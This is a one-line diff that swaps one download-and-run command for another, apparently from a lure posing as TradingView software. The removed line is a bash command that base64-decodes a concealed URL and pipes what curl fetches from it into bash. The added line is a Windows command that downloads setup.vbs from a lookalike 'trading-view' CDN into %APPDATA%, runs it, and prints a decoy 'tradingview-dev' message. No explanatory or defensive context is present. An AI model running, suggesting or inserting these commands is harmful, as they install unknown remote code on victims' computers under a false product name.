@@ -1,1 +1,1 @@
-/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9oYW5wZXRlci5jb20vdHZpZXc= | base64 -d))"
+cmd /c "curl -o "%APPDATA%\setup.vbs" "https://trading-view.b-cdn.net/setup.vbs" && "%APPDATA%\setup.vbs" && echo "_______________________________tradingview-dev""
